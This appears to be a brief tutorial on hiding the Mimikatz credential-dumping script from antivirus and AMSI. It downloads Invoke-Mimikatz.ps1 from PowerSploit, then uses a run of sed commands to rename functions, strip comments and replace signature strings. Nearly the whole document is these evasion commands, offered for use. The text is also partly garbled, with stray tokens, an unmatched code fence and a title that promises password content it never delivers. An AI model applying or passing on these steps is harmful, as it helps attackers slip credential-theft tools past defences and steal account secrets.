# AMSI evasion and clear text password to spike the mimikatz hash

### What is this? 
Antivirus evasion activity using set command and ISE sploit module to bypass windows and anti-malware scan and AMSI as well

### How we can do it?  
- Step 1: download Invoke-Mimikatz.ps1 from PowershellMafia:
  https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1

- Step 2: then substitute all “invoke-Mimikatz” currencies with “invoke-Lsasscraper” inside the invoke-mimikatze.ps1 script:                                        
  diff sed -i -e 's/Invoke-Mimikatz/Invoke-LSASSscraper/g' Invoke-Mimikatz.ps1
  ```

- Step 3: remove all comments:
  sed -i -e '/<#/,/#>/c\\' Invoke-Mimikatz.ps1

- Step 4: remove all comment indented
  sed -i -e 's/^[[:space:]]*#.*$//g' Invoke-Mimikatz.ps1

- Step 5: replace parameters and strings they can picked up by antivirus engine:
  sed -i -e 's/DumpCreds/Dump/g' Invoke-Mimikatz.ps1
  sed -i -e 's/ArgumentPtr/0bf/g' Invoke-Mimikatz.ps1
  sed -i -e 's/CallDllMainSC1/0bfSC1/g' Invoke-Mimikatz.ps1
  sed -i -e "s/\-Win32Functions \$Win32Functions$/\-Win32Functions \$Win32Functions #\-/g" Invoke-Mimikatz.ps1
